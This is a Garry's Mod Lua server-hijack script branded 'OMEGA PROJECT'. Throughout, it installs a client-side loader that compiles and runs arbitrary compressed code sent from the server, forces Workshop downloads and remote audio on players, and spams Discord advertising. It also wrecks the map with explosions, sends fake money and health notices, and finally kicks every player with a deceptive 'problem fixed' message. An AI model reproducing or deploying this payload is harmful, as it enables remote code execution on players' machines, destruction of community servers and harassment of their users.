for k,v in pairs(player.GetAll()) do 

        v:ChatPrint( "XSSAWOLF joined the server." )
        v:ChatPrint( "AXSAWOLF joined the server." )
        v:ChatPrint( "ASXAWOLF joined the server." )
        v:ChatPrint( "ASSXWOLF joined the server." )
        v:ChatPrint( "ASSAXOLF joined the server." )
        v:ChatPrint( "ASSAWXLF joined the server." )
        v:ChatPrint( "ASSAWOXF joined the server." )
        v:ChatPrint( "ASSAWOLX joined the server." )

    end

for k, v in pairs(player.GetAll()) do
    v:SendLua("steamworks.FileInfo(605490729,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)") -- PLAYER MODEL 
    v:SendLua("steamworks.FileInfo(1999155526,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)") -- Particles
    v:SendLua("steamworks.FileInfo(1998192109,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)") -- Particles
    v:ConCommand("say /job OMEGA PROJECT > ALL")
    v:ConCommand("say /OOC Se serveur va se faire purger: https://discord.gg/rqM6CQ8")
   
    local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
    end
    timer.Simple( 25, function()
        util.AddNetworkString("faitleserv")
        local props2 = ents.GetAll()
        for _, prop in ipairs( props2 ) do
            if(prop:GetPhysicsObject():IsValid()) then
                prop:SetModel("models/red_eye/metal_sonic.mdl")
            end
        end
        timer.Create("efdfeger"..math.random(500,50000), 1.5, 0, function()
            local props2 = ents.GetAll()
            for _, prop in ipairs( props2 ) do
                if(prop:GetPhysicsObject():IsValid()) then
                    if(prop:GetModel() == "models/red_eye/metal_sonic.mdl") then else
                        prop:SetModel("models/red_eye/metal_sonic.mdl")
                    end
                end
            end
        end)
        timer.Simple( 1, function()
            for k,v in pairs(player.GetAll()) do
                v:GodEnable()
                v:SetRunSpeed(400* 4);
                v:SetWalkSpeed(400 * 4);
                v:ConCommand("say /OOC Se serveur va se faire purger");
                v:ConCommand("say /OOC Se serveur va se faire purger");
                v:ConCommand("say /OOC Se serveur va se faire purger");
                v:ConCommand("say /OOC Se serveur va se faire purger");
            end
        end)
        for k, v in pairs( player.GetAll() ) do
            if ( v:Alive() ) then
                v:GodEnable()
                v:SetModel("models/red_eye/metal_sonic.mdl")
                v:Spawn()
                timer.Simple( 5, function()
                    v:GodEnable()
                    v:SetModel("models/red_eye/metal_sonic.mdl")
                end)
            end
        end


game.AddParticles( "particles/lesheitan.pcf" )

PrecacheParticleSystem("OMEGA")

timer.Simple(34,function()
        SendToClient([[  

            timer.Create("spamchatbienchiant", 1.5, 0, function()
                local time = tonumber(0)
                local Message = {
                    "        Ω OMEGA PROJECT discord.gg/YWNT72b Ω",
                    "       Ω OMEGA PROJECT discord.gg/YWNT72b Ω",
                    "      Ω OMEGA PROJECT discord.gg/YWNT72b Ω",
                    "     Ω OMEGA PROJECT discord.gg/YWNT72b Ω",
                    "    Ω OMEGA PROJECT discord.gg/YWNT72b Ω",
                    "   Ω OMEGA PROJECT discord.gg/YWNT72b Ω",
                    "  Ω OMEGA PROJECT discord.gg/YWNT72b Ω",
                    " Ω OMEGA PROJECT discord.gg/YWNT72b Ω",
                    "Ω OMEGA PROJECT discord.gg/YWNT72b Ω",
                    " Ω OMEGA PROJECT discord.gg/YWNT72b Ω",
                    "  Ω OMEGA PROJECT discord.gg/YWNT72b Ω",
                    "   Ω OMEGA PROJECT discord.gg/YWNT72b Ω",
                    "    Ω OMEGA PROJECT discord.gg/YWNT72b Ω",
                    "     Ω OMEGA PROJECT discord.gg/YWNT72b Ω",
                    "      Ω OMEGA PROJECT discord.gg/YWNT72b Ω",
                    "       Ω OMEGA PROJECT discord.gg/YWNT72b Ω",
                    "        Ω OMEGA PROJECT discord.gg/YWNT72b Ω"
                }

                for _, line in pairs(Message) do
                    time = time + tonumber(0.1)
                    timer.Simple(time,function()
                        chat.AddText(HSVToColor( CurTime() % 6 * 60, 1, 1 ),line)
                    end)
                end
            end)
            timer.Simple(20, function()
        timer.Create("sex_on_the_beach", 0.1, 0, function()
            notification.AddLegacy( "SERVER GET OVERFUCKED BY WOLF", math.random(0, 4), 1.5 )
        end)
end)
        ]])
end)
 
        local function rdm_str(len)
            if not len or len <= 0 then
                return ''
            end
            return rdm_str(len - 1) .. ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")[math.random(1, 62)]
        end
        local net_string = rdm_str(25)
        util.AddNetworkString(net_string)
        BroadcastLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
        hook.Add("PlayerInitialSpawn", "ifyouseethisdontpanicitsme",function(ply)
            if not ply:IsBot() then
                ply:SendLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
        end
    end)
        local function SendToClient(code)
            local data = util.Compress(code)
            local len = #data net.Start(net_string)
            net.WriteUInt(len, 16)
            net.WriteData(data, len)
            net.Broadcast()
        end
        timer.Simple( 1, function()
            SendToClient([[
game.AddParticles( "particles/lesheitan.pcf" )

PrecacheParticleSystem("kpanel")


                local defaultfov = LocalPlayer():GetFOV()
                local override = 70 hook.Add("CalcView", "EXROR_", function(ply, origin, angles, fov, znear, zfar) return { ["origin"] = origin, ["angles"] = angles, ["fov"] = override, ["znear"] = znear, ["zfar"] = zfar }
            end)
            local hide = { ["CHudHealth"] = true, ["CHudCrosshair"] = true }
            hook.Add( "HUDShouldDraw", "HideHUD", function( name ) if ( hide[ name ] ) then return false end
        end )
        local prevFrame = {}
        local prevValue = 2
        local aveclazicmu = {}
        hook.Add("HUDPaint", "bahouiilfautquemusiquesoitbien",function()
            for k,v in pairs(aveclazicmu) do v() end
        end)
        SOUNDSTART_CTP = false
        OZJFOZJCEZIO = true
        sound.PlayURL("https://assawolf.website/songs/6am.mp3","mono noblock noplay",function(s)
            if not s then return end
            if SOUNDSTART_CTP then s:Stop() return end
            SOUNDSTART_CTP = true
            s:SetVolume(6.5)
            s:Play()
            local ragtbl = {}
            aveclazicmu["CoolEffect"] = function()
            local tbl = {} s:FFT(tbl,FFT_4096) xpcall(function()
            local fal = 0 for i=1,40 do
                fal = fal + tbl[i] end
                prevValue = Lerp(130 * FrameTime(), prevValue, fal) if fal > 2 then
                    override = Lerp(1 * FrameTime(), override, fal * .875)
                    net.Start("faitleserv") net.SendToServer()
                else
                    override = Lerp(2 * FrameTime(), override, defaultfov)
                    sent = false
                end
            end,function()
        end)
    end
end) ]])
end)
timer.Simple( 1, function()
SendToClient([[
-- timer.Simple(5, function()
--  table.Empty(debug.getregistry())
-- end)
surface.CreateFont( "PixelCutsceneScaled",{ font = "Open Sans", size = 500, weight = 1000, antialias = true })
surface.CreateFont( "PixelCutsceneScaledSmall",{ font = "Open Sans", size = 50, weight = 1000, antialias = true })
surface.CreateFont( "PixelSmall",{ font = "Open Sans", size = 135, weight = 500, antialias = false })
surface.CreateFont("lapolice", { font = "Open Sans", size = ScrW()*0.02, weight = 10, blursize = 0, scanlines = 2.5, antialias = false })
local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8) local w,h = ScrW(), ScrH() local W, H = ScrW(), ScrH()
local MySelf = LocalPlayer()
if ohno then ohno:Remove()
    ohno = nil end
    ohno = vgui.Create( "DFrame" )
    ohno:SetSize( w, h )
    ohno:SetPos(0,0)
    ohno:SetDraggable ( false )
    ohno:SetTitle("")
    ohno:ShowCloseButton(false)
    ohno.Paint = function( self )
    surface.SetDrawColor(30, 30, 30, 0)
end
glitchtext = { "ERROR_ win $inf", "ERXOX_ win $inf", "EXROR_ win $inf", "XRRXR_ win $inf", "6H4CK_ win $inf", "GH4CK_ win $inf", "6HACK_ win $inf", "GHXCK_ win $inf", "EXXOX_ win $inf", }
local pw, ph = w, h*0.6 local px, py = w/2-pw/2, h/2-ph/2
local Close = vgui.Create( "DButton", ohno )
Close:SetPos(px, py)
Close:SetText( "" )
Close:SetSize( pw, ph )
Close.Paint = function( self, tw, th )
local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8)
local shift = math.sin(RealTime()*3)*1.5 + 5
local text2 = "ERROR"
draw.SimpleText( text2, "PixelCutsceneScaled", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
draw.SimpleText( text2, "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end
timer.Simple( 6, function()
Close.Paint = function( self, tw, th )
local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8)
local shift = math.sin(RealTime()*3)*1.5 + 5
local text = "Omega Project" local down = [=[(/.__.)/ HIBOU \(.__.\)]=]
draw.SimpleText( down, "PixelCutsceneScaledSmall", tw/2 , th/2 +100, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER) draw.SimpleText( down, "PixelCutsceneScaledSmall", tw/2 - shift , th/2 +100 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
draw.SimpleText( text, "PixelCutsceneScaled", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER) draw.SimpleText( text, "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end
timer.Simple( 15, function()
Close.Paint = function( self, tw, th ) local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8) local shift = math.sin(RealTime()*3)*1.5 + 5
local text = "OMEGA PROJECT"
draw.SimpleText( text, "PixelCutsceneScaled", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
draw.SimpleText( text, "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end
 
end)

timer.Simple( 70, function()
for i = 1, 10 do
        ParticleEffectAttach("OMEGA",PATTACH_ABSORIGIN_FOLLOW,LocalPlayer(),0)
end
 
Close.Paint = function( self, tw, th )
local
coltext = HSVToColor(CurTime() * 36 % 360, .3, .8) local shift = math.sin(RealTime()*3)*1.5 + 5
local text = { "OMEGA", "OXEXA", "XXXGA", "OMEXX", "OMEGA", "OMEGA", "OMEXA", "OMEXX", "XXXXA", "PROJECT", "PROJECT", }
hook.Add( "Think", "omgilawinlebogos", function() plyk,plyv = table.Random(player.GetAll()) end)
draw.SimpleText( Entity(plyv):Nick().." win $inf", "PixelCutsceneScaledSmall", tw/2 , th/2 +100, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
draw.SimpleText( Entity(plyv):Nick().." win $inf", "PixelCutsceneScaledSmall", tw/2 - shift , th/2 +100 - shift, Color(math.random(240,255), math.random(240,255), math.random(240,255), 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
draw.SimpleText( table.Random(text), "PixelCutsceneScaled", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER) draw.SimpleText( table.Random(text), "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end
timer.Create("fff", 0.1, 0, function()
util.ScreenShake( Vector(0,0,0), 2.5, 50, 0.5, 5000 )
end)
hook.Add( "HUDPaint", "truckde merde", function()
draw.DrawText( "ASSAWOLF", "lapolice", ScrW() * 0.5, ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), TEXT_ALIGN_CENTER )
draw.DrawText( "./CORNFLEX", "lapolice", math.random(0,10), ScrH() * (math.random(0,100)*0.01), Color( 240, 100, 100, math.random(230,255) ), 0 )
draw.DrawText( "Ω", "lapolice", W * 0.7 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "INPLEX", "lapolice", W * 0.38 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "ASSAWOLF", "lapolice", W * 0.9 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "Ω", "lapolice", W * 0.35 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "Ω", "lapolice", W * 0.98 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "OMEGA > ALL", "lapolice", W * 0.8 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "WOLVES", "lapolice", W * 0.73 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "No Signal", "lapolice", W * 0.27 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "SEIZED", "lapolice", W * 0.1 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "Inplex", "lapolice", W * 0.05 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "Random Guy", "lapolice", W * 0.11 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "No Signal", "lapolice", W * 0.75 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "DOMINATION", "lapolice", W * 0.8 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "Inplex", "lapolice", W * 0.2 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "OMEGA", "lapolice", W * 0.1 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "PROJECT", "lapolice", W * 0 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
draw.DrawText( "OMEGA PROJECT > ALL", "lapolice", W * 0 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
end)
end)
timer.Simple( 270, function() Close.Paint = function( self, tw, th ) local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8) local shift = math.sin(RealTime()*3)*1.5 + 5
glitchtextend = { "ERROR_", "ERXOX_", "EXROR_", "XRRXR_", "6H4cK_", "EXXOX_", } draw.SimpleText( table.Random(glitchtextend), "PixelCutsceneScaled", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
draw.SimpleText( table.Random(glitchtextend), "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end
end)
timer.Simple( 278, function()
Close.Paint = function( self, tw, th )
local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8) local shift = math.sin(RealTime()*3)*1.5 + 5
draw.SimpleText( "3", "PixelCutsceneScaled", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
draw.SimpleText( "3", "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end
end)
timer.Simple( 279, function() Close.Paint = function( self, tw, th )
local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8) local shift = math.sin(RealTime()*3)*1.5 + 5
draw.SimpleText( "2", "PixelCutsceneScaled", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
draw.SimpleText( "2", "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end
end)
timer.Simple( 280, function()
Close.Paint = function( self, tw, th )
local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8) local shift = math.sin(RealTime()*3)*1.5 + 5
draw.SimpleText( "1", "PixelCutsceneScaled", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
draw.SimpleText( "1", "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end
end)
timer.Simple( 281, function()
Close.Paint = function( self, tw, th )
local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8)
local shift = math.sin(RealTime()*3)*1.5 + 5
local titeltext = "OMEGA PROJECT"
local titeltextdow = "BY ASSAWOLF"
draw.SimpleText( titeltextdow, "PixelCutsceneScaledSmall", tw/2 , th/2 +100, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
draw.SimpleText( titeltextdow, "PixelCutsceneScaledSmall", tw/2 - shift , th/2 +100 - shift, Color(math.random(240,255), math.random(240,255), math.random(240,255), 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
draw.SimpleText( titeltext, "PixelCutsceneScaled", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER) draw.SimpleText( titeltext, "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end
end)
local name = GetConVar("sv_skyname"):GetString()
if name == "painted" then
    local sky for _, v in ipairs(ents.GetAll()) do
        if v:GetClass() == "env_skypaint" then
            sky = v break
        end
    end
    if not IsValid(sky) then return end
    hook.Add("PostRender","\xFFsky\xFF",function()
    local col = HSVToColor(CurTime() * 36 % 360, .3, .8) local vsky = Vector(col.r / 255, col.g / 255, col.b / 255) sky:SetTopColor(vsky) sky:SetBottomColor(vsky)
end)
else
    local prefix = {"lf","ft","rt","bk","dn","up"}
    local mats = {} for i=1,6 do mats[#mats+1] = Material("skybox/" .. name .. prefix[i])
    end
    hook.Add("PostRender","\xFFsky\xFF",function() local r = 0.5*math.sin(RealTime()*0.5)*240 + 255 local g = -0.5*math.sin(RealTime()*0.5)*240 + 255 local b = 215 for i=1,6 do mats[i]:SetVector("$color",Vector(r/254,g/254,b/254))
    end
end)
end
timer.Create("aaneyjvkybtk", 0.01, 0, function()
local mat = Entity(0):GetMaterials() local col = HSVToColor(CurTime() * 36 % 360, .3, .8) local ve = Vector(col.r / 255, col.g / 255, col.b / 255) LocalPlayer():SetWeaponColor( Vector(ve) )
for k,v in pairs(mat) do
    local col = HSVToColor(CurTime() * 36 % 360, .3, .8) local ve = Vector(col.r / 255, col.g / 255, col.b / 255) Material(v):SetVector("$color", ve)
end
end)
hook.Add("Think","butifoule",function() local col = HSVToColor(CurTime() * 36 % 360, .3, .8) local v = Vector(col.r / 255, col.g / 255, col.b / 255)
for k, v in pairs( ents.FindByClass( "prop_*" ) ) do
    v:SetColor( col ) v:Activate()
end
for k,p in pairs(player.GetAll()) do
    p:SetColor( col )
end
end)
end)
timer.Create("mdr-ta-thune", 15, 0, function()
local fdcal = math.random(1,2) if fdcal == 1 then notification.AddLegacy( "Console set your money to $inf.", 0 , 5 ) else notification.AddLegacy( "Console set your health to $inf.", 0 , 5 ) end end) ]])
        end)
        timer.Create("ok", 1, 0, function()
            for k, v in pairs( ents.FindByClass( "prop_*" ) ) do
            local phys = v:GetPhysicsObject() if (IsValid(phys)) then
            phys:EnableMotion(true) end end end)
            timer.Simple( 44, function()
            timer.Create("ok", 1, 60, function()
            local props = ents.GetAll() for _, prop in ipairs( props ) do
            if(prop:GetPhysicsObject():IsValid()) then
            prop:GetPhysicsObject():ApplyForceCenter( Vector( 100, 0, ((1500 * 0.73) * prop:GetPhysicsObject():GetMass() ) ) )
            end
            end
            for i = 1, 15 do
            local explode = ents.Create( "env_explosion" )
            explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) )
            explode:Spawn()
            explode:SetKeyValue( "iMagnitude", "500" )
            explode:Fire( "Explode", 0, 0 )
            end
            for k,v in pairs(player.GetAll()) do
            v:SetVelocity(v:GetVelocity() + Vector(math.random(10,50), math.random(10,50), math.random(500,600)))
            end
            end)
            end)
            timer.Simple( 166.5, function()
                timer.Create("ok2", 1, 48, function()
                local props = ents.GetAll()
                for _, prop in ipairs( props ) do
                    if(prop:GetPhysicsObject():IsValid()) then
                        prop:GetPhysicsObject():ApplyForceCenter( Vector( 100, 0, ((1500 * 0.73) * prop:GetPhysicsObject():GetMass() ) ) )
                        end
                        end
                        for i = 1, 15 do
                        local explode = ents.Create( "env_explosion" )
                        explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) )
                        explode:Spawn()
                        explode:SetKeyValue( "iMagnitude", "500" )
                        explode:Fire( "Explode", 0, 0 )
                        end
                        for k,v in pairs(player.GetAll()) do
                        v:SetVelocity(v:GetVelocity() + Vector(math.random(10,50), math.random(10,50), math.random(500,600)))
                        end
                    end)
            end)
            timer.Simple( 240, function()
                local propsexplod = ents.GetAll()
                for _, prop in ipairs( propsexplod ) do
                    if(prop:GetPhysicsObject():IsValid()) then
                        local explosion = ents.Create("env_explosion")
                        explosion:SetPos(vehicl:GetPos())
                        explosion:Spawn()
                        explosion:SetKeyValue("iMagnitude", "50")
                        explosion:Fire("Explode", 0, 0)
                    end
                end
            end)
            timer.Simple( 6, function()
                local sun = ents.FindByClass("env_sun")
                    if #sun == 0 then return end
                    sun = sun[1]
                    hook.Add("Think","\xFFsun\xFF",function()
                        sun:SetKeyValue("sun_dir", math.sin(CurTime())/3 .. " " .. math.cos(CurTime())/3 .. " 0.901970")
                        sun:SetModelScale(120)
                    end)
                end)
            timer.Simple( 207, function()
                timer.Create("explodend", 1, 0, function()
                    for i = 1, 10 do
                        local explode = ents.Create( "env_explosion" )
                        explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) )
                        explode:Spawn()
                        explode:SetKeyValue( "iMagnitude", "500" )
                        explode:Fire( "Explode", 0, 0 )
                    end
                end)
            end)
            timer.Simple( 290, function()
                for i,v in ipairs(player.GetAll()) do
                    if v == p then continue end
                    v:Kick("\n[FR] Oh désolé, je ne me suis pas présenté ,je suis EXROR_ votre serveur a rencontré un problème que j'ai corrigé, vous pouvez maintenant retourner sur votre serveur !\n\n\nOMEGA PROJECT( https://discord.gg/rqM6CQ8 )\n\n------------------------------------------\n\n[EN] Oh sorry, I didn't introduce myself ,I'm EXROR_ your server has encountered a problem that I fixed, you can now go back to your server !\n\n\nOMEGA PROJECT ( https://discord.gg/rqM6CQ8 )")
                end
            end)
            timer.Simple( 300, function()
                RunConsoleCommand("changelevel", "gm_construct")
            end)
            net.Receive("faitleserv", function()
                for i = 1,2 do
                    local explode = ents.Create( "env_explosion" )
                    explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) )
                    explode:Spawn() explode:SetKeyValue( "iMagnitude", "500" )
                    explode:Fire( "Explode", 0, 0 )
                end
                local props = ents.GetAll()
                for _, prop in ipairs( props ) do
                    if(prop:GetPhysicsObject():IsValid()) then
                        prop:GetPhysicsObject():ApplyForceCenter( Vector( 0, 0, ((250 * 0.93) * prop:GetPhysicsObject():GetMass() ) ) )
                    end
                end
                for k,v in pairs(player.GetAll()) do
                    v:SetVelocity(v:GetVelocity() + Vector(math.random(10,50), math.random(10,50), math.random(50,100)))
                end
            end)
            local untitled_ = { "OMEGA", "PROJECT", "OMEGA PROJECT","OMEGA PROJECT > ALL" }
            for k, v in pairs(player.GetAll()) do
                timer.Create("charglogo", 0, 0, function()
                    v:setDarkRPVar("job", "JOB_"..table.Random( untitled_ )) v:setDarkRPVar("money", "1e+999")
                end)
            end
        end)